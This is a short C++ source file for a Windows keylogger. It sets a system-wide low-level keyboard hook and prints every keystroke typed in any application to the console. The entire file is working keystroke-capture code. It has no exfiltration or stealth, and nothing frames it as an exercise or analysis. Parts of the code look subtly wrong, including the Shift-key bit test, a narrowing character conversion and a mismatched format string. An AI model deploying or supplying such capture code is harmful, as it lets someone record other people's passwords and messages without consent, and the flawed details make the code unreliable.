#include <Windows.h>
#include <iostream>
#include <sstream>

LRESULT __stdcall hookCallback(int, WPARAM, LPARAM);
void logKeystroke(int);
void lockKeyboard();
void releaseKeyboard();

HHOOK ghHook; // global handle to the hook
KBDLLHOOKSTRUCT kbdStruct;

void logKeystroke(int vkCode) {
    // KBDLLHOOKSTRUCT stores the keyboard inputs as Virtual-Key codes
    // resolution and logging of the keystrokes is performed here
    // also ignores mouse inputs
    
    HKL kbLayout = GetKeyboardLayout(GetCurrentProcessId());

    
    // check for CapsLock
    bool lowercase = !(GetKeyState(VK_CAPITAL) & 0x0001);
    
    // check for Shift keys
    if((GetKeyState(VK_SHIFT) & 0x1000) || (GetKeyState(VK_LSHIFT) & 0x1000) || (GetKeyState(VK_RSHIFT) & 0x1000)) {
        lowercase = !lowercase;
    }

    char key = MapVirtualKeyExW(vkCode, MAPVK_VK_TO_CHAR, kbLayout);
    key = (lowercase) ? tolower(key) : key;

    printf("%c", key);
}

LRESULT __stdcall hookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    // function handler for all keyboard strokes

    if(nCode >= 0) {
        if(wParam == WM_KEYDOWN) {
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

            logKeystroke(kbdStruct.vkCode);
        }
    }

    return CallNextHookEx(ghHook, nCode, wParam, lParam);
}

void lockKeyboard() {
    
    // set the keyboard hook for all processes on the computer
    // runs the hookCallback function when hooked is triggered
    if(!(ghHook = SetWindowsHookExW(WH_KEYBOARD_LL, hookCallback, NULL, 0))) {
        wprintf(L"%s: %d", "Hooked failed to install with error code", GetLastError());
    }

    wprintf(L"Hook successfully installed!");

}

void releaseKeyboard() {

    UnhookWindowsHookEx(ghHook);

}

int wmain() {
    
    lockKeyboard();
    
    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0)) {
        
    }

    return 0;
}